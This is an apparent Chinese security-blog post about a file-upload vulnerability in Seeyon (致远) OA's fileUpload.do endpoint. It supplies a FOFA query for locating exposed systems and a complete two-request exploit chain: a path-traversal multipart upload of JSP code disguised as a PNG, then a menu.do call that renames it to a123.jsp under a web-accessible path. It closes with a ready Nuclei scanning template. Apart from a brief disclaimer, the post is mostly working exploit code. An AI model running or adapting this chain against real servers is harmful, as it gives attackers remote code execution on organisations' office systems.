#  致远互联 OA fileUpload.do 文件上传漏洞   
lcyunkong  云途安全   2024-04-24 12:02  
  
**0x00 阅读须知**  
  
****  
**免责声明：****本文提供的信息和方法仅供网络安全专业人员用于教学和研究目的，不得用于任何非法活动。读者若使用文章内容从事任何未授权的行为，需自行承担所有法律责任和后果。本公众号及作者对由此引起的任何直接或间接损失不负责任。请严格遵守相关法律法规。**  
###   
### 0x01 漏洞简介  
  
  
致远OA  
是一款企业级办公自动化软件，提供了办公流程管理、文档管理、协同办公、知识管理等功能。它可以帮助企业实现信息化办公，提高工作效率和协同能力。该系统fileUpload.do存在文件上传漏洞。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSZHkc78DelKm8BpNmgicbv3WeFEJRBsb250za777sENwibOZxibay9ptTpxBJJ89qoksRhx24np9R4Eg/640?wx_fmt=png&from=appmsg "")  
###   
### 0x02 漏洞详情  
  
****  
**fofa：****app="FE-协作平台" || title="协同管理软件 V5.6SP1"**  
  
  
**Poc：**  
```
POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Type: multipart/form-data; boundary=skdHHhNHjhnUgerSexsksboundary
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)

--skdHHhNHjhnUgerSexsksboundary
Content-Disposition: form-data; name="type"


--skdHHhNHjhnUgerSexsksboundary
Content-Disposition: form-data; name="extensions"

png
--skdHHhNHjhnUgerSexsksboundary
Content-Disposition: form-data; name="applicationCategory"


--skdHHhNHjhnUgerSexsksboundary
Content-Disposition: form-data; name="destDirectory"


--skdHHhNHjhnUgerSexsksboundary
Content-Disposition: form-data; name="destFilename"


--skdHHhNHjhnUgerSexsksboundary
Content-Disposition: form-data; name="maxSize"


--skdHHhNHjhnUgerSexsksboundary
Content-Disposition: form-data; name="isEncrypt"

false
--skdHHhNHjhnUgerSexsksboundary
Content-Disposition: form-data; name="file1"; filename="1.png"
Content-Type: Content-Type: application/pdf

<% out.println("hello test");%>
--skdHHhNHjhnUgerSexsksboundary--

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSZHkc78DelKm8BpNmgicbv3WRvm4XIyu9iafTSsnpq0IYbEEtTvPPQHtUuuSnuAQrXdKMFyDYicbia60Q/640?wx_fmt=png&from=appmsg "")  
```
POST /seeyon/autoinstall.do/../../seeyon/privilege/menu.do HTTP/1.1
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)

method=uploadMenuIcon&fileid=7866719621757354789&filename=a123.jsp
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSZHkc78DelKm8BpNmgicbv3W2GcHp9XDMQ6wonYn5Ktx6Bsb3Kpr4CiaNPAKC7EWaD4ZM7O8n1wQlRw/640?wx_fmt=png&from=appmsg "")  
  
**路径：**  
/seeyon/main/menuIcon/a123.jsp  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSZHkc78DelKm8BpNmgicbv3WeCMODsz8vRGf7HnhibH7AyR9NCwADrsbbfHkhoGJCFtWZlrXsicSnzyw/640?wx_fmt=png&from=appmsg "")  
  
**0x03 Nuclie**  
  
```
id: zhiyuanOA-fileUpload-fileupload

info:
  name: zhiyuanOA-fileUpload-fileupload
  author: unknown
  severity: high
  description: 致远互联 OA fileUpload.do 文件上传漏洞
  tags: zhiyuanOA,fileupload

http:
  - raw:
      - |
        POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Content-Type: multipart/form-data; boundary=skdHHhNHjhnUgerSexsksboundary
        User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)
        Content-Length: 854

        --skdHHhNHjhnUgerSexsksboundary
        Content-Disposition: form-data; name="type"


        --skdHHhNHjhnUgerSexsksboundary
        Content-Disposition: form-data; name="extensions"

        png
        --skdHHhNHjhnUgerSexsksboundary
        Content-Disposition: form-data; name="applicationCategory"


        --skdHHhNHjhnUgerSexsksboundary
        Content-Disposition: form-data; name="destDirectory"


        --skdHHhNHjhnUgerSexsksboundary
        Content-Disposition: form-data; name="destFilename"


        --skdHHhNHjhnUgerSexsksboundary
        Content-Disposition: form-data; name="maxSize"


        --skdHHhNHjhnUgerSexsksboundary
        Content-Disposition: form-data; name="isEncrypt"

        false
        --skdHHhNHjhnUgerSexsksboundary
        Content-Disposition: form-data; name="file1"; filename="AdsjkHjhggc_adf.png"
        Content-Type: Content-Type: application/pdf

        <% out.println("hello test");%>
        --skdHHhNHjhnUgerSexsksboundary--

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - AdsjkHjhggc_adf.png
      - type: word
        part: body
        words:
          - fileurls=fileurls
      - type: status
        status:
          - 200
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSZHkc78DelKm8BpNmgicbv3WKtjic3IbkJIwsBmHFYia6ic0DDwkjRticOjibPLWl3WCCgzBdzDc8LRUazA/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
